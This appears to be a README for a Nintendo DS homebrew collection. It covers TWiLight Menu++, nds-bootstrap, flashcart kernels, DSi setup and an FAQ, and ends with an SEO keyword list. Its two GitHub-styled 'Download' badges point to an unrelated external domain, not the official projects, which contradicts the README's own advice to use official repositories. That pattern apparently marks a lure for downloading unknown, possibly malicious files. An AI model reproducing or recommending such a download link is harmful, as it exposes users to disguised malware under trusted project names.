
# Nintendo DS Homebrew & Firmware Tools

<p align="center">
  <img src="https://img.shields.io/badge/Nintendo-DS-red?style=for-the-badge&logo=nintendo" alt="Nintendo DS"/>
  <img src="https://img.shields.io/badge/Homebrew-Supported-success?style=for-the-badge" alt="Homebrew"/>
  <img src="https://img.shields.io/badge/TWiLight%20Menu++-27.25.1-blue?style=for-the-badge" alt="TWiLight Menu++"/>
  <img src="https://img.shields.io/badge/Platform-DS%20%2F%20DS%20Lite%20%2F%20DSi-informational?style=for-the-badge" alt="Supported platforms"/>
</p>

<p align="center">
  Homebrew software, flashcart kernels, game loaders, emulators, and SD card utilities for Nintendo DS systems.
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Nintendo%20DS%20Tools-blue?style=for-the-badge&logo=github" alt="Download Nintendo DS Tools"/></a>
</p>

## Overview

Nintendo DS Homebrew & Firmware Tools is a community software collection for Nintendo DS, Nintendo DS Lite, and Nintendo DSi systems.

The project focuses on homebrew applications, flashcart software, alternative menu systems, game loaders, emulators, and storage configuration.

The main software recommendation is TWiLight Menu++, a menu replacement that can launch homebrew and compatible Nintendo DS software.

This repository is not a replacement Nintendo firmware. Most original DS and DS Lite systems use a flashcart with a microSD card, while DSi systems can also use SD-card-based homebrew setups.

## Key Features

- TWiLight Menu++ alternative menu
- nds-bootstrap game loader
- R4 and compatible flashcart kernel resources
- YSMenu kernel for supported flashcards
- Pico Loader for compatible flashcards
- Homebrew application support
- Game Boy and Game Boy Color emulation
- Save file management
- Cheat and per-game configuration support
- Custom themes and menu layouts
- SD and microSD card setup guides
- Troubleshooting and compatibility documentation

## Technical Specifications

| Component | Description |
|---|---|
| Main software | TWiLight Menu++ |
| Latest documented release | v27.25.1 |
| Game loader | nds-bootstrap |
| Alternative loader | Pico Loader |
| Flashcart kernel | Device-specific |
| Homebrew format | `.nds` |
| DS game format | `.nds` |
| Save format | `.sav` and title-specific formats |
| Storage | SD / microSD |
| Filesystem | FAT32 recommended |
| Main configuration | `settings.ini` |

TWiLight Menu++ and nds-bootstrap are software components, not replacement console firmware.

## Compatibility

| Console | Compatibility |
|---|---|
| Nintendo DS | Supported through compatible flashcards |
| Nintendo DS Lite | Supported through compatible flashcards |
| Nintendo DSi | SD-card homebrew and compatible flashcards |
| Nintendo DSi XL | SD-card homebrew and compatible flashcards |
| Nintendo 3DS | Supported by TWiLight Menu++ |
| Nintendo 2DS | Supported by TWiLight Menu++ |

Flashcart compatibility depends on the exact cartridge model, hardware revision, and microSD card.

An R4 label alone is not enough to identify the correct kernel. Different R4 cards can require completely different software.

## Firmware Features

This project covers several different types of Nintendo DS software:

- **TWiLight Menu++:** Alternative menu for launching homebrew and games.
- **nds-bootstrap:** Software game loader that launches compatible DS titles without relying entirely on the flashcart's original kernel.
- **YSMenu:** Alternative flashcart kernel for supported cartridge models.
- **Pico Loader:** Additional game loader option for compatible flashcards.
- **Unlaunch:** DSi bootloader exploit that provides additional boot and homebrew options.
- **HiyaCFW:** Custom firmware environment for compatible DSi systems.

These components are not interchangeable. A flashcart kernel is not the same as console firmware, and TWiLight Menu++ does not itself install a custom firmware.

## System Requirements

### Basic setup

- Nintendo DS, DS Lite, DSi, or compatible 3DS family console
- Compatible flashcart or DSi SD-card homebrew setup
- microSD card
- microSD card reader
- FAT32-formatted storage
- Computer for downloading and copying files

### Recommended storage

| Card capacity | Recommendation |
|---|---|
| 4 GB | Basic homebrew collection |
| 8 GB | Recommended for smaller libraries |
| 16 GB | Good general-purpose capacity |
| 32 GB | Suitable for larger collections |

Use a reliable microSD card and keep backups of save files before changing kernels or formatting storage.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-DS%20Homebrew%20Package-blue?style=for-the-badge&logo=github" alt="Download DS Homebrew Package"/></a>
</p>

### Install TWiLight Menu++ on a flashcart

1. Identify the exact flashcart model and hardware revision.
2. Download the Flashcard Edition of TWiLight Menu++.
3. Extract the downloaded archive.
4. Copy the required `_nds` folder and `BOOT.NDS` file to the microSD root.
5. Follow the flashcart-specific autoboot instructions if necessary.
6. Place homebrew applications in an organized folder.
7. Insert the microSD card into the flashcart.
8. Start the console and launch TWiLight Menu++.

The exact setup can differ between R4, DSTT, Acekard, and other flashcart families.

### Install on Nintendo DSi

1. Back up the contents of the SD card.
2. Check the DSi system and homebrew compatibility.
3. Follow the official TWiLight Menu++ DSi installation guide.
4. Copy the required files to the SD card.
5. Use the supported installation or boot method.
6. Launch TWiLight Menu++ from the configured entry point.

### Install homebrew applications

1. Download homebrew software from its developer or official project repository.
2. Extract the `.nds` file if it is packaged in an archive.
3. Copy it to the homebrew folder on the SD card.
4. Start TWiLight Menu++.
5. Select the application to launch it.

Only use game backups and software that you are legally entitled to use.

## Configuration & Management

### TWiLight Menu++

- Change the menu theme.
- Configure display and interface options.
- Organize applications into folders.
- Configure per-game settings.
- Manage save files.
- Choose the appropriate game loader.

### Game loaders

TWiLight Menu++ can use nds-bootstrap, Pico Loader, or a supported flashcart kernel.

The best option depends on the flashcart and the individual game. Some games may work better with one loader than another.

### Save management

- Keep save files backed up.
- Do not format the microSD card without copying saves elsewhere.
- Preserve the expected save directory structure.
- Avoid using incompatible save formats between different emulators or loaders.

## Troubleshooting

| Problem | Recommended Action |
|---|---|
| Menu does not start | Verify the flashcart model and required kernel files |
| White screens during startup | Check loader compatibility and microSD integrity |
| Games do not appear | Verify file extensions and folder locations |
| Save files are missing | Check the save directory and filename |
| R4 shows a loading error | Confirm that the kernel matches the exact cartridge revision |
| TWiLight Menu++ fails to boot | Recheck the copied files and autoboot configuration |
| Some games do not work | Try a compatible alternative loader |
| SD card errors occur | Back up data and test the card for filesystem errors |

## FAQ

### 1. Is this a Nintendo DS custom firmware?

No. It is a collection of homebrew tools, loaders, and flashcart software. Some DSi setups can additionally use custom firmware environments.

### 2. What is TWiLight Menu++?

TWiLight Menu++ is an alternative menu system for launching Nintendo DS software and homebrew applications.

### 3. What is nds-bootstrap?

nds-bootstrap is a software loader used to run compatible Nintendo DS and DSi software.

### 4. Does TWiLight Menu++ work on DS Lite?

Yes, when used with a compatible flashcart.

### 5. Can I use an R4 card?

Yes, but the correct kernel depends on the exact R4 model and revision.

### 6. What is YSMenu?

YSMenu is an alternative flashcart kernel for a defined set of compatible flashcards.

### 7. What is Pico Loader?

Pico Loader is an additional game loader option for supported flashcards. It can offer faster startup and different compatibility characteristics.

### 8. Do I need to install Unlaunch?

No. Unlaunch is relevant to certain Nintendo DSi homebrew setups, not ordinary DS or DS Lite flashcart installations.

### 9. Can I use a 32 GB microSD card?

Yes. A FAT32-formatted card is commonly used. Compatibility and formatting requirements depend on the flashcart.

### 10. Can I run emulators?

Yes. TWiLight Menu++ supports homebrew applications and various emulator options, subject to hardware limitations.

### 11. Can I update TWiLight Menu++ without losing saves?

Normally, updating the software should preserve saves if the existing save folders are left intact. Back up the SD card first.

### 12. Where should I download software?

Use the official DS-Homebrew GitHub repositories and project documentation. Avoid unofficial archives containing modified or unknown executables.

## SEO Keywords

Nintendo DS homebrew, Nintendo DS firmware tools, Nintendo DS custom firmware, Nintendo DS flashcart kernel, TWiLight Menu++, nds-bootstrap, YSMenu, Pico Loader, R4 kernel, R4 firmware, Nintendo DS Lite homebrew, Nintendo DSi homebrew, Nintendo DSi custom firmware, Unlaunch DSi, HiyaCFW, DS homebrew applications, DS game loader, Nintendo DS emulator, DS ROM management, microSD setup, flashcart software, DS save management, Nintendo DS utilities, homebrew launcher, DS menu replacement, Nintendo handheld software, DSi SD card setup, DS flashcard compatibility
